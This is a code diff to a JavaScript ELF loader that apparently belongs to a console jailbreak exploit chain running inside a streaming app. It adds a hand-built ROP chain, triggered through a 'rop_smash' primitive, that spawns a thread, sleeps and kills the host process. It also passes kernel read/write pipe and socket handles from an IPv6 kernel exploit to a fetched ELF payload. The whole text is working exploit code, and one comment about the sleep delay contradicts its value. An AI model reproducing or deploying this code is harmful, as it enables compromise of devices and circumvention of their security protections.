@@ -1,6 +1,7 @@
 // https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/elf_loader.lua
 // Only expected to load john tornblom's elfldr.elf
 // credit to nullptr for porting to lua and specter for the original code
+// credit to c0w-ar for isolating rop chain to improve stability 
 
 const ELF_SHADOW_MAPPING_ADDR = 0x920100000n;
 const ELF_MAPPING_ADDR = 0x926100000n;
@@ -137,112 +138,117 @@ async function elf_parse(elf_store) {
     return elf_entry_point;
 }
 
-async function elf_run(elf_entry_point) {
+
+
+function spawn_thread_and_wait(thr_handle_addr, elf_entry_point, args, timespec_addr) {
+
+    // Get PID using syscall primitive lol
+    const pid = syscall(SYSCALL.getpid);
+
+    write64(add_rop_smash_code_store, 0xab0025n);
+    real_rbp = addrof(rop_smash(1)) + 0x700000000n + 1n;
+
+    let i = 0;
+
+    // Arguments for thread creation
+    fake_rop[i++] = g.get('pop_rdi');
+    fake_rop[i++] = thr_handle_addr;
+    fake_rop[i++] = g.get('pop_rsi');
+    fake_rop[i++] = elf_entry_point;
+    fake_rop[i++] = g.get('pop_rdx');
+    fake_rop[i++] = args;
+    fake_rop[i++] = g.get('pop_rcx');
+    fake_rop[i++] = 0n;
+    fake_rop[i++] = g.get('pop_r8');
+    fake_rop[i++] = 0n;
+    fake_rop[i++] = g.get('pop_r9');
+    fake_rop[i++] = 0n;
+
+    // Create Thread
+    fake_rop[i++] = Thrd_create;
+
+    // Nanosleep syscall
+    fake_rop[i++] = g.get('pop_rdi');
+    fake_rop[i++] = timespec_addr;
+    fake_rop[i++] = g.get('pop_rsi');
+    fake_rop[i++] = 0n;
+    fake_rop[i++] = g.get('pop_rax');
+    fake_rop[i++] = 0xf0n;
+    fake_rop[i++] = syscall_wrapper;
+
+    // Kill process
+    fake_rop[i++] = g.get('pop_rdi');
+    fake_rop[i++] = pid;                      
+    fake_rop[i++] = g.get('pop_rsi');
+    fake_rop[i++] = 9n;                        // SIGKILL
+    fake_rop[i++] = g.get('pop_rax');
+    fake_rop[i++] = 0x25n;
+    fake_rop[i++] = syscall_wrapper;
+
+    write64(add_rop_smash_code_store, 0xab00260325n);
+    fake_rw[59] = (fake_frame & 0xffffffffn);
+    rop_smash(fake_obj_arr[0]);
+}
+
+
+async function elf_run(elf_entry_point, payloadout) {
     logger.flush();
     const rwpipe = malloc(8);
     const rwpair = malloc(8);
     const args = malloc(0x30);
     const thr_handle_addr = malloc(8);
-    
+    const timespec_addr = malloc(16);  // timespec structure: {tv_sec, tv_nsec}
+
     write32_uncompressed(rwpipe, ipv6_kernel_rw.data.pipe_read_fd);
     write32_uncompressed(rwpipe + 0x4n, ipv6_kernel_rw.data.pipe_write_fd);
-    
+
     write32_uncompressed(rwpair, ipv6_kernel_rw.data.master_sock);
     write32_uncompressed(rwpair + 0x4n, ipv6_kernel_rw.data.victim_sock);
-    
-    const payloadout = malloc(4);
-    
+
+    // Setup timespec for nanosleep: 0.02 second delay
+    write64_uncompressed(timespec_addr, 0n);           // tv_sec = 0 second
+    write64_uncompressed(timespec_addr + 8n, 250000000n);      // tv_nsec = 10000000 nanoseconds
+
     // We are reusing syscall_wrapper from gettimeofdayAddr
     write64_uncompressed(args + 0x00n, syscall_wrapper - 0x7n);                  // arg1 = syscall wrapper
     write64_uncompressed(args + 0x08n, rwpipe);                                  // arg2 = int *rwpipe[2]
     write64_uncompressed(args + 0x10n, rwpair);                                  // arg3 = int *rwpair[2]
-    write64_uncompressed(args + 0x18n, ipv6_kernel_rw.data.pipe_addr);          // arg4 = uint64_t kpipe_addr
+    write64_uncompressed(args + 0x18n, ipv6_kernel_rw.data.pipe_addr);           // arg4 = uint64_t kpipe_addr
     write64_uncompressed(args + 0x20n, kernel.addr.data_base);                   // arg5 = uint64_t kdata_base_addr
     write64_uncompressed(args + 0x28n, payloadout);                              // arg6 = int *payloadout
-    
-    // Spawn elf in new thread
-    const ret = call(Thrd_create, thr_handle_addr, elf_entry_point, args);
-    if(ret != 0n){
-	send_notification("Thrd_create failed, ret = " + String(hex(ret)));
-	logger.log("Thrd_create failed, ret = " + hex(ret));
-    	logger.flush();
-    	throw new Error("Thrd_create() error: " + hex(ret));
 
-	}
+    // Spawn elf in new thread, sleep, then exit
+    spawn_thread_and_wait(thr_handle_addr, elf_entry_point, args, timespec_addr);
 
-    /* Blocking Gibbon's thread until elfldr finishes */
-    await sleep(500); 
-    
-    if (ret !== 0n) {
-        throw new Error("Thrd_create() error: " + hex(ret));
-    }
-
-    const thr_handle = read64_uncompressed(thr_handle_addr);
-
-    return {thr_handle, payloadout };
+    // After this point we cannot use the ROP (process will exit)
 }
 
-
-function notify_elf_magic(ptr) {
-    let mags = [];
-    for (let i = 0; i < 45; i++) {
-        mags.push(read8_uncompressed(ptr + BigInt(i)).toString(16).padStart(2,"0"));
-    }
-    send_notification("ELF DUMP 45 bytes: \n" + mags.join(" "));
-}
-async function elf_wait_for_exit(thr_handle, payloadout) {
-    // Will block until elf terminates
-    const ret = call(Thrd_join, thr_handle, 0n);
-    if (ret !== 0n) {
-        send_notification("Thrd_join() error: " + hex(ret));
-        throw new Error("Thrd_join() error: " + hex(ret));
-    }
-    
-    const out = read32_uncompressed(payloadout);
-    send_notification("out: " + hex(out));
-    logger.log("out = " + hex(out));
-    logger.flush();
-}
-
-async function kill_nf() {
-    const pid = syscall(SYSCALL.getpid);
-    syscall(SYSCALL.kill, pid, SIGKILL);
-}
 
 async function elf_loader() {
     try {
 
         check_jailbroken();
-        send_notification("elf_loader.js loaded!");
-        
+
         logger.log("Loading elfldr.elf from proxy");
         logger.flush();
 
         const elf_data = malloc(400*1024);
         let elf_size = fetch_file("elfldr.elf", elf_data);
-        
-        send_notification("elfldr.elf received size:" + String(elf_size));
+
         if(elf_size < 1000) {
             throw new Error("Something went wrong while reading elfldr.elf");
         }
-        
-        notify_elf_magic(elf_data);
-	
         const elf_entry_point = await elf_parse(elf_data); // We pass the buffer pointer directly
-        
-        const {thr_handle, payloadout} = await elf_run(elf_entry_point);
-        
 
-        //await elf_wait_for_exit(thr_handle, payloadout);
-        await sleep(500); 
+        const payloadout = malloc(4);
+        await elf_run(elf_entry_point, payloadout);
+
         logger.log("Done");
         logger.flush();
-        kill_nf();
 
     } catch (e) {
-        logger.log("Error: " + e.message);
-        logger.flush();
-        send_notification("Error: " + e.message);
+        logger.log("elfloader js Error: " + e.message);
+        logger.log(e.stack);
         throw e;
     }
 }
